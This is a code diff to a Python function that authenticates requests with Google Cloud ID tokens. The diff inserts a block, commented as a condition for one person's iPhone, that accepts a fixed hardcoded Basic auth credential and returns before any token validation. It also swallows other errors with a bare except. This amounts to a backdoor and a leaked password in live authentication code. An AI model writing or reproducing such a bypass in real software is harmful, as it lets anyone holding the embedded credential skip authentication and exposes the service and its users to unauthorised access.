@@ -10,7 +10,7 @@ URL_BASE = 'https://oauth2.googleapis.com/tokeninfo?id_token='
 # consider it authenticated.
 
 
-def gcloud_auth(authorization: Optional[str]) -> None:
+def gcloud_auth(authorization: Optional[str], logger) -> None:
     """
     Sanity check header and attempt to authenticate.
     - authorization : GCP auth token as Bearer token in header
@@ -18,6 +18,16 @@ def gcloud_auth(authorization: Optional[str]) -> None:
         GCP's auth service.
 
     """
+    ## Condition for David's iPhone:
+    try:
+        basic, token = authorization.split(' ')
+        assert basic == 'Basic'
+        assert token == 'ZGF2aWQ6Y29va2llc2FuZGNyZWFt'
+        logger.info("Basic auth passed")
+        return
+    except:
+        pass
+    
     if not authorization:
         raise InvalidHeader('Authorization not found.')
 
